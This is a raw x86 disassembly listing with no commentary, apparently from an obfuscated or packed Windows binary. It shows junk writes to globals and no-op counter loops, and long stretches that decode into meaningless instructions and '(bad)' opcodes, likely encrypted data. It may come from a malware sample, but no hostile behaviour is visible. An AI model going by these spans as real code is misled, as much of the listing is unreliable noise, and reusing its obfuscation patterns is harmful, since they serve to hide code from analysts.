  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	arpl   WORD PTR [eax],di
  40e416:	pop    ss
  40e417:	fist   DWORD PTR [esi]
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3b4
  40e421:	xchg   ebx,eax
  40e422:	pop    ebp
  40e423:	out    dx,eax
  40e424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e426:	mov    eax,ds:0x9fb91335
  40e42b:	imul   DWORD PTR [edx+ecx*8+0x409dbc53]
  40e432:	leave  
  40e433:	adc    eax,0xbe22dac
  40e439:	popf   
  40e43a:	scas   al,BYTE PTR es:[edi]
  40e43b:	push   esi
  40e43c:	or     eax,0x50d6e3c3
  40e441:	in     eax,0x84
  40e443:	xor    al,BYTE PTR [edi-0x6b]
  40e446:	fcomip st,st(4)
  40e448:	adc    eax,0xe20deee7
  40e44d:	stos   BYTE PTR es:[edi],al
  40e44e:	pop    esp
  40e44f:	inc    edx
  40e450:	fwait
  40e451:	xlat   BYTE PTR ds:[ebx]
  40e452:	data16 add dl,ah
  40e455:	inc    eax
  40e456:	pop    ebp
  40e457:	shl    BYTE PTR [ebp-0x58],cl
  40e45a:	jbe    0x40e3fd
  40e45c:	repz stc 
  40e45e:	adc    ch,ch
  40e460:	in     eax,dx
  40e461:	test   eax,0x776151d8
  40e466:	arpl   WORD PTR [ebx],cx
  40e468:	pop    esi
  40e469:	jnp    0x40e468
  40e46b:	mov    al,ds:0x84ce656
  40e470:	cmp    cl,dl
  40e472:	xor    al,0x6e
  40e474:	inc    esi
  40e475:	call   DWORD PTR es:[eax-0x17]
  40e479:	mov    ss,WORD PTR [esi+0x7c]
  40e47c:	mov    BYTE PTR [esi],ch
  40e47e:	fst    DWORD PTR [eax+0x19c09ce3]
  40e484:	adc    BYTE PTR [edi],0xdb
  40e487:	or     edx,DWORD PTR [edx]
  40e489:	fwait
  40e48a:	mov    ah,0xf8
  40e48c:	sbb    DWORD PTR [edi-0x20a05fc5],ebx
  40e492:	sub    edx,DWORD PTR [edi+0x6b7d4444]
  40e498:	jns    0x40e454
  40e49a:	mov    ecx,0xdaa6b0c1
  40e49f:	or     DWORD PTR [esi],ebp
  40e4a1:	adc    ebp,edi
  40e4a3:	nop
  40e4a4:	jbe    0x40e47c
  40e4a6:	mov    edi,0xa604f254
  40e4ab:	pop    ebx
  40e4ac:	in     al,dx
  40e4ad:	mov    cl,0x59
  40e4af:	aas    
  40e4b0:	pushf  
  40e4b1:	stos   BYTE PTR es:[edi],al
  40e4b2:	mov    BYTE PTR [ebx+0x5e9209f1],ch
  40e4b8:	cmp    ch,BYTE PTR [ebp+edi*8+0x618831c]
  40e4bf:	pop    esi
  40e4c0:	or     al,0xd1
  40e4c2:	pop    ecx
  40e4c3:	into   
  40e4c4:	inc    ecx
  40e4c5:	mov    dh,0x6f
  40e4c7:	mov    bh,0xe8
  40e4c9:	in     eax,0x72
  40e4cb:	add    eax,0x452a8e4e
  40e4d0:	sub    al,0x7
  40e4d2:	repnz push ebp
  40e4d4:	and    al,0xd6
  40e4d6:	sub    BYTE PTR [edx+0x75],al
  40e4d9:	mov    al,0x1d
  40e4db:	retf   
  40e4dc:	pop    eax
  40e4dd:	daa    
  40e4de:	add    al,dh
  40e4e0:	push   ss
  40e4e1:	rcr    DWORD PTR [ebp+0x2d666c60],1
  40e4e7:	nop
  40e4e8:	push   ebx
  40e4e9:	xacquire xchg BYTE PTR [ecx],dh
  40e4ec:	(bad)  
  40e4ed:	std    
  40e4ee:	data16 jge 0x40e500
  40e4f1:	or     eax,DWORD PTR [eax+edx*8]
  40e4f4:	mov    eax,ds:0x98e7174b
  40e4f9:	xor    eax,0xc1fa65ee
  40e4fe:	xor    DWORD PTR [edx],0xde8e50b8
  40e504:	inc    esi
  40e505:	dec    ebp
  40e506:	(bad)  [esi]
  40e508:	hlt    
  40e509:	xor    DWORD PTR [edi],edx
  40e50b:	es mov ecx,0x8568a09e
  40e511:	and    al,BYTE PTR [ebx]
  40e513:	enter  0x4c0c,0xb1
  40e517:	loop   0x40e4d7
  40e519:	or     DWORD PTR [ebp-0x40],edi
  40e51c:	adc    al,0x4c
  40e51e:	test   BYTE PTR [ecx-0x3f90f379],dh
  40e524:	std    
  40e525:	das    
  40e526:	xor    esi,DWORD PTR [esi+0x11c645e4]
  40e52c:	cmp    BYTE PTR [eax+0x8],0xc1
  40e530:	push   cs
  40e531:	std    
  40e532:	dec    esp
  40e533:	push   ebx
  40e534:	fistp  DWORD PTR [ecx-0x71]
  40e537:	stos   BYTE PTR es:[edi],al
  40e538:	adc    BYTE PTR [edi+0x458b5bc5],dl
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x15f261b8
  40e5b4:	jp     0x40e5d0
  40e5b6:	mov    bh,0x2a
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e615
  40e5c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c1:	out    dx,eax
  40e5c2:	bound  esi,QWORD PTR [edi-0x1c]
  40e5c5:	mov    ds:0x2172e8a0,al
  40e5ca:	or     al,0x69
  40e5cc:	add    BYTE PTR [ebp+0x44],cl
  40e5cf:	out    dx,al
  40e5d0:	mov    al,0x10
  40e5d2:	pusha  
  40e5d3:	(bad)  
  40e5d5:	js     0x40e613
  40e5d7:	cmp    eax,0x3633b70b
  40e5dc:	sbb    bl,ah
  40e5de:	test   DWORD PTR [ebp+0x69],ebp
  40e5e1:	loopne 0x40e5d5
  40e5e3:	xchg   edx,eax
  40e5e4:	retf   
  40e5e5:	xor    al,0x14
  40e5e7:	sub    dh,BYTE PTR [ecx-0x38]
  40e5ea:	push   0x5f
  40e5ec:	jo     0x40e584
  40e5ee:	pushf  
  40e5ef:	or     esi,ebp
  40e5f1:	stc    
  40e5f2:	add    bl,bh
  40e5f4:	push   ebp
  40e5f5:	pop    esi
  40e5f6:	or     ch,BYTE PTR [edi-0x6471f705]
  40e5fc:	ror    esi,1
  40e5fe:	repz cdq 
  40e600:	loop   0x40e623
  40e602:	dec    edx
  40e603:	ds mov ebx,0x5c22c2b2
  40e609:	icebp  
  40e60a:	not    BYTE PTR [ecx]
  40e60c:	enter  0xac9,0xd8
  40e610:	dec    ecx
  40e611:	mov    ecx,ecx
  40e613:	ds jno 0x40e5bb
  40e616:	nop
  40e617:	dec    edx
  40e618:	sub    BYTE PTR [esp+esi*2-0x1b],ch
  40e61c:	dec    ecx
  40e61d:	jnp    0x40e665
  40e61f:	out    0x43,al
  40e621:	add    eax,0x7bd9054b
  40e626:	or     DWORD PTR [ecx-0x2feb7b71],eax
  40e62c:	cmp    eax,0x232806b5
  40e631:	fdiv   DWORD PTR [edx-0x32c2e6ab]
  40e637:	cmp    BYTE PTR [ecx-0xe10bc84],dh
  40e63d:	popa   
  40e63e:	add    BYTE PTR [edi-0x5802c888],al
  40e644:	mov    ebx,0x9f07115f
  40e649:	pusha  
  40e64a:	mov    ch,BYTE PTR [ecx]
  40e64c:	cs das 
  40e64e:	push   ss
  40e64f:	addr16 call 0x4ec88e24
  40e655:	arpl   bx,di
  40e657:	and    eax,0xaaac11ad
  40e65c:	xchg   BYTE PTR [esi+esi*2-0x302b21ea],ch
  40e663:	mov    ebp,0x9e9cd807
  40e668:	loope  0x40e63e
  40e66a:	lahf   
  40e66b:	cdq    
  40e66c:	pusha  
  40e66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e66e:	dec    edx
  40e66f:	push   ds
  40e670:	add    esi,DWORD PTR [edi-0x8ed1664]
  40e676:	cli    
  40e677:	adc    eax,0xb446f4d8
  40e67c:	jae    0x40e6b4
  40e67e:	jns    0x40e685
  40e680:	les    edx,FWORD PTR [ecx]
  40e682:	or     DWORD PTR [edi-0x42fcf508],ebx
  40e688:	inc    edi
  40e689:	mov    ds:0xe749eded,eax
  40e68e:	mov    eax,0x2063cabc
  40e693:	sbb    ebx,DWORD PTR [ecx+0x3d]
  40e696:	fs mov ebp,0x4e80f17e
  40e69c:	icebp  
  40e69d:	scas   al,BYTE PTR es:[edi]
  40e69e:	cmp    dh,BYTE PTR [ebp-0x63c7506c]
  40e6a4:	adc    al,0x2d
  40e6a6:	mov    al,ds:0x99bfdf88
  40e6ab:	loopne 0x40e66f
  40e6ad:	ret    0x74aa
  40e6b0:	jmp    0xa8bf:0xd11c5f1a
  40e6b7:	inc    esp
  40e6b8:	sbb    DWORD PTR [ebp-0x4f122342],ecx
  40e6be:	shl    ecx,cl
  40e6c0:	cdq    
  40e6c1:	jl     0x40e6ae
  40e6c3:	pushf  
  40e6c4:	sub    DWORD PTR [edi],eax
  40e6c6:	enter  0x488a,0x27
  40e6ca:	pushf  
  40e6cb:	dec    eax
  40e6cc:	shr    DWORD PTR [esi-0x68],cl
  40e6cf:	push   esp
  40e6d0:	nop
  40e6d1:	inc    esp
  40e6d2:	in     eax,0xe8
  40e6d4:	enter  0x1323,0x4d
  40e6d8:	mov    DWORD PTR [ebx+0x3b34a178],ebp
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0xfb271ef]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6a0
  40e704:	sbb    BYTE PTR [edi-0x4b],bl
  40e707:	cs cmp al,0xe9
  40e70a:	fdivr  st,st(4)
  40e70c:	test   al,0x97
  40e70e:	sub    eax,ebp
  40e710:	mov    eax,0x8490bd2d
  40e715:	loop   0x40e77d
  40e717:	ins    BYTE PTR es:[edi],dx
  40e718:	fimul  WORD PTR [edi]
  40e71a:	and    eax,0x29493098
  40e71f:	push   esp
  40e720:	in     eax,dx
  40e721:	lea    ebp,[eax]
  40e723:	jns    0x40e786
  40e725:	adc    ah,bl
  40e727:	adc    dl,BYTE PTR ds:0x828e0cbf
  40e72d:	repz sub al,0x8e
  40e730:	xchg   ecx,eax
  40e731:	mov    esi,0xa02c878f
  40e736:	test   DWORD PTR [ebx],esi
  40e738:	sbb    al,BYTE PTR [edi+0x78]
  40e73b:	inc    ebp
  40e73c:	mov    dl,0xfe
  40e73e:	sbb    BYTE PTR [eax],al
  40e740:	jo     0x40e732
  40e742:	rol    esi,1
  40e744:	xchg   esp,eax
  40e745:	or     BYTE PTR [eax+0x5471d458],ch
  40e74b:	das    
  40e74c:	lahf   
  40e74d:	xchg   ebp,eax
  40e74e:	inc    edx
  40e74f:	retf   
  40e750:	adc    eax,0xb65ea5aa
  40e755:	aam    0x89
  40e757:	mov    eax,ds:0xe8c0e25d
  40e75c:	ror    DWORD PTR [esi],0x77
  40e75f:	call   0x41c1:0xd36a2b8
  40e766:	xor    dl,BYTE PTR ds:0x851a2a06
  40e76c:	or     ch,BYTE PTR [esi+0xc]
  40e76f:	mov    ecx,0x9da17087
  40e774:	sbb    BYTE PTR [edx-0x14],ah
  40e777:	cmp    al,0x11
  40e779:	lds    edx,FWORD PTR [edx]
  40e77b:	lods   al,BYTE PTR fs:[esi]
  40e77d:	mov    edx,0xc1ce3860
  40e782:	jns    0x40e7b1
  40e784:	clc    
  40e785:	sbb    DWORD PTR [eax-0x56],edi
  40e788:	adc    dl,al
  40e78a:	and    bl,ch
  40e78c:	inc    ebp
  40e78d:	dec    eax
  40e78e:	sahf   
  40e78f:	jo     0x40e770
  40e791:	adc    DWORD PTR [edi+0x792b6c01],edi
  40e797:	jae    0x40e780
  40e799:	mov    ebx,DWORD PTR [edi]
  40e79b:	daa    
  40e79c:	mov    bl,BYTE PTR [ebx]
  40e79e:	jmp    0x40e7f8
  40e7a0:	mov    esi,0x7025e092
  40e7a5:	sbb    BYTE PTR [ecx-0x4e],0x29
  40e7a9:	pop    edi
  40e7aa:	or     BYTE PTR [ebx],dl
  40e7ac:	fmul   QWORD PTR [edi-0x42]
  40e7af:	das    
  40e7b0:	arpl   WORD PTR [esi+0x43],cx
  40e7b3:	pop    esi
  40e7b4:	mov    dh,0x31
  40e7b6:	mov    dl,0x3e
  40e7b8:	sbb    BYTE PTR [ebx+0xedbd3d4],dl
  40e7be:	cmp    BYTE PTR [ecx+ecx*4+0x2e362c9c],bh
  40e7c5:	addr16 sub edi,edi
  40e7c8:	jo     0x40e78b
  40e7ca:	mov    ah,0xe7
  40e7cc:	fist   DWORD PTR [ebp-0x24]
  40e7cf:	dec    ecx
  40e7d0:	jecxz  0x40e844
  40e7d2:	stos   BYTE PTR es:[edi],al
  40e7d3:	push   esp
  40e7d4:	lods   al,BYTE PTR ds:[esi]
  40e7d5:	pop    ebp
  40e7d6:	pushf  
  40e7d7:	jmp    0x40e7bb
  40e7d9:	jge    0x40e762
  40e7db:	fidivr DWORD PTR [esi+ebp*1-0x29]
  40e7df:	cmp    al,BYTE PTR [ecx+edx*2+0x1]
  40e7e3:	imul   DWORD PTR [ecx+0x0]
  40e7e6:	lock lock xchg DWORD PTR [edx+0x1e4fb401],ecx
  40e7ee:	mov    fs,ebx
  40e7f0:	mov    dh,0x1e
  40e7f2:	fst    st(0)
  40e7f4:	fwait
  40e7f5:	inc    ebp
  40e7f6:	mov    dh,0x33
  40e7f8:	repz jg 0x40e799
  40e7fb:	(bad)  
  40e7fc:	rol    DWORD PTR [edi+0x71],cl
  40e7ff:	gs repz jae 0x40e831
  40e803:	sbb    DWORD PTR [esi-0x18],ebp
  40e806:	and    DWORD PTR [esi+0x33],edi
  40e809:	retf   
  40e80a:	push   esp
  40e80b:	or     DWORD PTR [ecx+edx*8+0x26],edx
  40e80f:	imul   edi
  40e811:	ffree  st(0)
  40e813:	or     DWORD PTR [edi-0x41ce04bc],edx
  40e819:	xor    DWORD PTR [esp+edi*8+0x10],eax
  40e81d:	lods   eax,DWORD PTR ds:[esi]
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e89b
  40e854:	xchg   ecx,eax
  40e855:	popa   
  40e856:	sbb    edx,esp
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e861
  40e860:	jo     0x40e860
  40e862:	xchg   ebp,eax
  40e863:	jnp    0x40e823
  40e865:	iret   
  40e866:	in     al,0xc9
  40e868:	cwde   
  40e869:	shl    bl,0x6
  40e86c:	adc    al,0xa1
  40e86e:	lahf   
  40e86f:	jbe    0x40e860
  40e871:	inc    edi
  40e872:	mov    ch,0x61
  40e874:	loopne 0x40e88c
  40e876:	in     eax,dx
  40e877:	lock clc 
  40e879:	xchg   edx,eax
  40e87a:	(bad)  
  40e87b:	adc    eax,0xce4c14c5
  40e880:	adc    BYTE PTR [edi-0x6b076f8e],cl
  40e886:	test   al,0x82
  40e888:	ret    
  40e889:	and    ebp,DWORD PTR [ebx+0x1c]
  40e88c:	pop    edx
  40e88d:	mov    ?,WORD PTR [ebx+0xd]
  40e890:	imul   esi,DWORD PTR [esi],0xffffffb2
  40e893:	mov    ds:0x15a0e29f,al
  40e898:	sub    cl,BYTE PTR [ecx-0x2fc1cc86]
  40e89e:	sti    
  40e89f:	push   ss
  40e8a0:	inc    ebx
  40e8a1:	mov    dl,0x72
  40e8a3:	out    dx,eax
  40e8a4:	data16 ds mov cl,0x6
  40e8a8:	fnsave [eax+0x52]
  40e8ab:	inc    esi
  40e8ac:	mov    al,0xff
  40e8ae:	lock stos WORD PTR es:[edi],ax
  40e8b1:	inc    edi
  40e8b2:	xlat   BYTE PTR ds:[ebx]
  40e8b3:	inc    edx
  40e8b4:	iret   
  40e8b5:	test   DWORD PTR [esi+0x6f3977ef],edi
  40e8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8bc:	adc    eax,0x111ea007
  40e8c1:	fadd   QWORD PTR [esi]
  40e8c3:	sti    
  40e8c4:	or     al,0x98
  40e8c6:	or     eax,0xab5ba248
  40e8cb:	mov    WORD PTR [edi+0x2a],cs
  40e8ce:	mov    ds:0x8891ebd4,al
  40e8d3:	retf   
  40e8d4:	mov    cl,cl
  40e8d6:	and    al,BYTE PTR [ebx+0x44bc20ed]
  40e8dc:	push   cs
  40e8dd:	jp     0x40e869
  40e8df:	push   edx
  40e8e0:	cmp    eax,0x31e0f62e
  40e8e5:	mov    al,0x5e
  40e8e7:	std    
  40e8e8:	mov    ch,BYTE PTR [ebx+0x7c]
  40e8eb:	jp     0x40e874
  40e8ed:	add    ecx,ecx
  40e8ef:	sbb    eax,edx
  40e8f1:	iret   
  40e8f2:	dec    esi
  40e8f3:	retf   0xb8bd
  40e8f6:	mov    esi,0xed6a5cc2
  40e8fb:	and    dh,BYTE PTR [ebx+0x70]
  40e8fe:	(bad)
  40e901:	int3   
  40e902:	sbb    DWORD PTR [ecx],esp
  40e904:	imul   esp,DWORD PTR [edi],0x5
  40e907:	pop    ebx
  40e908:	icebp  
  40e909:	int3   
  40e90a:	mov    ebp,0xe93614a5
  40e90f:	and    al,0xcb
  40e911:	adc    esp,DWORD PTR ds:[ebx+0x24]
  40e915:	mov    ebx,0x6f31969e
  40e91a:	jle    0x40e985
  40e91c:	mov    bh,0x1d
  40e91e:	jno    0x40e97f
  40e920:	cld    
  40e921:	cli    
  40e922:	pop    ds
  40e923:	or     DWORD PTR [ebp+0x2f001836],ebx
  40e929:	addr16 jb 0x40e941
  40e92c:	and    eax,0xc491ab8f
  40e931:	sub    DWORD PTR [ecx],eax
  40e933:	fidiv  WORD PTR [ecx-0x48]
  40e936:	mov    ch,0xb8
  40e938:	das    
  40e939:	enter  0x9e8c,0x84
  40e93d:	daa    
  40e93e:	enter  0x4969,0xf1
  40e942:	dec    eax
  40e943:	addr16 call 0x97b4:0x4ce572d
  40e94b:	jl     0x40e981
  40e94d:	imul   ebp,ecx,0xffffffb7
  40e950:	mov    dh,0x39
  40e952:	or     BYTE PTR [ecx-0x15],0x38
  40e956:	fidiv  WORD PTR ds:0x901d67b
  40e95c:	enter  0xfea7,0x33
  40e960:	sbb    ebx,DWORD PTR [edx]
  40e962:	or     DWORD PTR [esi],esi
  40e964:	fs dec eax
  40e966:	lods   al,BYTE PTR ds:[esi]
  40e967:	mov    edi,0x576e26ba
  40e96c:	mov    dl,0x9e
  40e96e:	jne    0x40e8fe
  40e970:	jbe    0x40e961
  40e972:	pop    ebx
  40e973:	les    ebx,FWORD PTR [edx-0x76b3893a]
  40e979:	(bad)  
  40e97a:	xor    eax,0xf93e850f
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xbf14341d
  40e99c:	push   esi
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40ea20
  40e9a6:	cld    
  40e9a7:	bound  ebp,QWORD PTR [eax+0x2c]
  40e9aa:	mov    eax,0x3f722bb2
  40e9af:	cdq    
  40e9b0:	sbb    bh,bl
  40e9b2:	mov    al,ds:0x802cb9b4
  40e9b7:	mov    ah,0x74
  40e9b9:	dec    esi
  40e9ba:	test   eax,0x67666949
  40e9bf:	and    BYTE PTR [esi],dh
  40e9c1:	sbb    bl,BYTE PTR ds:0x2187cac6
  40e9c7:	push   edx
  40e9c8:	sbb    ah,dh
  40e9ca:	je     0x40e9c0
  40e9cc:	xchg   esp,eax
  40e9cd:	lods   eax,DWORD PTR ds:[esi]
  40e9ce:	sbb    ebp,DWORD PTR [ecx-0x226ddf6f]
  40e9d4:	stos   DWORD PTR es:[edi],eax
  40e9d5:	xor    BYTE PTR [edx+0x67],dl
  40e9d8:	and    BYTE PTR [edx-0x1c],0x1c
  40e9dc:	loope  0x40ea51
  40e9de:	mov    ebp,0xf051ea1
  40e9e3:	jg     0x40e9e6
  40e9e5:	jns    0x40e9e4
  40e9e7:	cli    
  40e9e8:	out    dx,eax
  40e9e9:	mov    WORD PTR ds:0xd44db3d2,es
  40e9ef:	sub    BYTE PTR [esi+eax*8-0x3a],ch
  40e9f3:	inc    eax
  40e9f4:	and    eax,0xf534ca25
  40e9f9:	push   ds
  40e9fa:	inc    edi
  40e9fb:	push   esi
  40e9fc:	imul   ebp,DWORD PTR [esi],0xbdc4553f
  40ea02:	retf   0x153f
  40ea05:	adc    bl,BYTE PTR [edi]
  40ea07:	pop    ebx
  40ea08:	pop    esi
  40ea09:	das    
  40ea0a:	loop   0x40e9ef
  40ea0c:	dec    edi
  40ea0d:	cmp    eax,0xe2bb5e99
  40ea12:	push   esp
  40ea13:	enter  0xe653,0x6
  40ea17:	or     eax,0x9cd6cc85
  40ea1c:	out    dx,al
  40ea1d:	int3   
  40ea1e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea20:	ret    0xe6d7
  40ea23:	out    dx,al
  40ea24:	jne    0x40ea2c
  40ea26:	cmc    
  40ea27:	xchg   esp,eax
  40ea28:	repnz imul ebx,DWORD PTR [edx],0x4c2c0cd5
  40ea2f:	fbld   TBYTE PTR [ebp-0x9fc6b6d]
  40ea35:	(bad)  
  40ea37:	lea    edi,[ebx+ebx*4-0x37]
  40ea3b:	pop    ss
  40ea3c:	dec    eax
  40ea3d:	ja     0x40ea6c
  40ea3f:	dec    esi
  40ea40:	pop    ebx
  40ea41:	sahf   
  40ea42:	test   al,0x74
  40ea44:	rcl    DWORD PTR [edx],0x69
  40ea47:	push   esp
  40ea48:	mov    dh,0x17
  40ea4a:	ss sub eax,0x4215922
  40ea50:	mov    ds:0x4c342d3a,eax
  40ea55:	sub    ecx,esi
  40ea57:	or     al,0x20
  40ea59:	pushf  
  40ea5a:	and    eax,DWORD PTR [edi]
  40ea5c:	iret   
  40ea5d:	mov    cl,0xf7
  40ea5f:	gs jns 0x40ea33
  40ea62:	sbb    cl,BYTE PTR [ebx+ebp*8+0x37]
  40ea66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea67:	sub    ebp,DWORD PTR [edi]
  40ea69:	fnsave [ebp-0x5467281d]
  40ea6f:	or     eax,0xf700be33
  40ea74:	sub    bh,BYTE PTR [edx]
  40ea76:	(bad)  
  40ea78:	shl    DWORD PTR [ecx+eiz*1+0x19a06957],1
  40ea7f:	jnp    0x40eaa9
  40ea81:	pop    edi
  40ea82:	push   cs
  40ea83:	inc    eax
  40ea84:	jno    0x40eae9
  40ea86:	mov    cl,0x96
  40ea88:	out    0xa9,al
  40ea8a:	and    eax,DWORD PTR [ecx]
  40ea8c:	or     BYTE PTR [ecx-0x41bdbbc4],bh
  40ea92:	xor    eax,0xa1370faa
  40ea97:	(bad)  [ebx-0x3c25cde4]
  40ea9d:	add    ch,cl
  40ea9f:	out    0xd9,eax
  40eaa1:	push   edx
  40eaa2:	push   ds
  40eaa3:	iret   
  40eaa4:	nop
  40eaa5:	add    ecx,DWORD PTR [eax]
  40eaa7:	cld    
  40eaa8:	mov    al,BYTE PTR [ebp-0x22]
  40eaab:	into   
  40eaac:	sahf   
  40eaad:	mov    ds:0xeab76e9c,eax
  40eab2:	push   ss
  40eab3:	and    edi,DWORD PTR [eax+0x46c4c0fa]
  40eab9:	inc    esi
  40eaba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eabb:	push   esp
  40eabc:	or     eax,0xfce7e342
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
